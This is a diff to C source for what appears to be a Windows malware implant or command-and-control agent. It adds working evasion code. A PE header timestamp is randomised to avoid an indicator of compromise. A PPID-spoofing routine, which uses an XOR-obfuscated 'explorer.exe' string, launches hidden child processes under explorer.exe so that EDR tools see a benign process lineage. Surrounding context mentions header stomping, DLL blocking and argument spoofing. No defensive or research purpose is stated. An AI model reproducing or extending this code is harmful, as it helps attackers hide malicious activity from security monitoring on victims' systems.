@@ -686,7 +686,13 @@ static void stomp_pe_header(HMODULE base) {
      * Characteristics=0 is safe on a running image.
      * DO NOT touch: SizeOfOptionalHeader (needed to locate section table).  */
     nt->FileHeader.NumberOfSections     = 0;
-    nt->FileHeader.TimeDateStamp        = 0;
+    {   /* Set a plausible historical timestamp (Jan 2019 – Dec 2023)
+         * instead of zero, which is itself an IOC.  Use __rdtsc() as a
+         * fast entropy source — no BCrypt dependency needed here.        */
+        DWORD _t = (DWORD)__rdtsc();
+        _t = (_t ^ 0x5A3B2C1D) % (1703980800u - 1546300800u) + 1546300800u;
+        nt->FileHeader.TimeDateStamp = _t;
+    }
     nt->FileHeader.PointerToSymbolTable = 0;
     nt->FileHeader.NumberOfSymbols      = 0;
     nt->FileHeader.Characteristics      = 0;
@@ -1343,6 +1349,149 @@ static BOOL create_process_block_dlls(const char *cmdline,
     return FALSE;
 }
 #endif /* ENABLE_BLOCK_DLLS */
+
+/* ================================================================== */
+/* PPID Spoofing  (#6)                                                  */
+/*                                                                      */
+/* Spawns child processes with explorer.exe as the apparent parent so   */
+/* that EDR parent-child chain analysis sees a benign lineage instead   */
+/* of agent.exe -> cmd.exe.                                             */
+/*                                                                      */
+/* Uses CreateToolhelp32Snapshot to locate explorer.exe, opens it with  */
+/* PROCESS_CREATE_PROCESS, and passes the handle via                    */
+/* PROC_THREAD_ATTRIBUTE_PARENT_PROCESS in an extended startup info.    */
+/* Falls back to plain CreateProcessA if anything fails.               */
+/* ================================================================== */
+
+#ifndef ENABLE_PPID_SPOOF
+#define ENABLE_PPID_SPOOF 1
+#endif
+
+#if ENABLE_PPID_SPOOF
+
+static int g_ppid_spoof = 0;
+
+#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
+#endif
+
+/*
+ * find_process_pid — locate a running process by name using toolhelp32.
+ * Returns the PID on success, 0 on failure.
+ */
+static DWORD find_process_pid(const char *name) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return 0;
+
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(pe);
+    if (Process32First(snap, &pe)) {
+        do {
+            if (_stricmp(pe.szExeFile, name) == 0) {
+                DWORD pid = pe.th32ProcessID;
+                CloseHandle(snap);
+                return pid;
+            }
+        } while (Process32Next(snap, &pe));
+    }
+    CloseHandle(snap);
+    return 0;
+}
+
+/*
+ * create_process_ppid_spoof — create a child process whose apparent parent
+ * is explorer.exe.  Uses PROC_THREAD_ATTRIBUTE_PARENT_PROCESS with an
+ * extended STARTUPINFOEXW.
+ */
+static BOOL create_process_ppid_spoof(const char *cmdline,
+                                      HANDLE hStdOut, HANDLE hStdErr,
+                                      PROCESS_INFORMATION *pi) {
+    BOOL  result = FALSE;
+    SIZE_T attrSize = 0;
+    LPPROC_THREAD_ATTRIBUTE_LIST attrList = NULL;
+    HANDLE hParent = NULL;
+
+    /* Find explorer.exe */
+    /* "explorer.exe" XOR 0x4B */
+    char sExpl[] = {0x2E,0x33,0x3B,0x27,0x24,0x39,0x2E,0x39,0x65,0x2E,0x33,0x2E,0x00};
+    for (int i = 0; sExpl[i]; i++) sExpl[i] ^= EVASION_XOR_KEY;
+    DWORD parentPid = find_process_pid(sExpl);
+    SecureZeroMemory(sExpl, sizeof(sExpl));
+    if (parentPid == 0) goto ppid_fallback;
+
+    hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
+    if (!hParent) goto ppid_fallback;
+
+    /* Convert narrow cmdline to wide */
+    int wlen = MultiByteToWideChar(CP_ACP, 0, cmdline, -1, NULL, 0);
+    if (wlen <= 0) goto ppid_fallback;
+    WCHAR *wcmd = (WCHAR *)HeapAlloc(GetProcessHeap(), 0, wlen * sizeof(WCHAR));
+    if (!wcmd) goto ppid_fallback;
+    MultiByteToWideChar(CP_ACP, 0, cmdline, -1, wcmd, wlen);
+
+    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
+    attrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),
+                                                        HEAP_ZERO_MEMORY,
+                                                        attrSize);
+    if (!attrList) { HeapFree(GetProcessHeap(), 0, wcmd); goto ppid_fallback; }
+
+    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize)) {
+        HeapFree(GetProcessHeap(), 0, attrList);
+        HeapFree(GetProcessHeap(), 0, wcmd);
+        goto ppid_fallback;
+    }
+
+    if (!UpdateProcThreadAttribute(attrList, 0,
+                                   PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                                   &hParent, sizeof(hParent), NULL, NULL)) {
+        DeleteProcThreadAttributeList(attrList);
+        HeapFree(GetProcessHeap(), 0, attrList);
+        HeapFree(GetProcessHeap(), 0, wcmd);
+        goto ppid_fallback;
+    }
+
+    STARTUPINFOEXW siex;
+    ZeroMemory(&siex, sizeof(siex));
+    siex.StartupInfo.cb          = sizeof(siex);
+    siex.StartupInfo.dwFlags     = STARTF_USESTDHANDLES;
+    siex.StartupInfo.hStdOutput  = hStdOut;
+    siex.StartupInfo.hStdError   = hStdErr;
+    siex.lpAttributeList         = attrList;
+
+    result = CreateProcessW(NULL, wcmd, NULL, NULL, TRUE,
+                            EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
+                            NULL, NULL,
+                            (LPSTARTUPINFOW)&siex, pi);
+
+    DeleteProcThreadAttributeList(attrList);
+    HeapFree(GetProcessHeap(), 0, attrList);
+    HeapFree(GetProcessHeap(), 0, wcmd);
+    if (hParent) CloseHandle(hParent);
+    return result;
+
+ppid_fallback:
+    if (hParent) CloseHandle(hParent);
+    {
+        STARTUPINFOA si;
+        ZeroMemory(&si, sizeof(si));
+        si.cb          = sizeof(si);
+        si.dwFlags     = STARTF_USESTDHANDLES;
+        si.hStdOutput  = hStdOut;
+        si.hStdError   = hStdErr;
+        return CreateProcessA(NULL, (LPSTR)cmdline, NULL, NULL, TRUE,
+                              CREATE_NO_WINDOW, NULL, NULL, &si, pi);
+    }
+}
+
+#else /* ENABLE_PPID_SPOOF == 0 */
+static int g_ppid_spoof = 0;
+static BOOL create_process_ppid_spoof(const char *cmdline,
+                                      HANDLE hStdOut, HANDLE hStdErr,
+                                      PROCESS_INFORMATION *pi) {
+    (void)cmdline; (void)hStdOut; (void)hStdErr; (void)pi;
+    return FALSE;
+}
+#endif /* ENABLE_PPID_SPOOF */
 
 /* ================================================================== */
 /* Argument Spoofing  (#111)                                            */
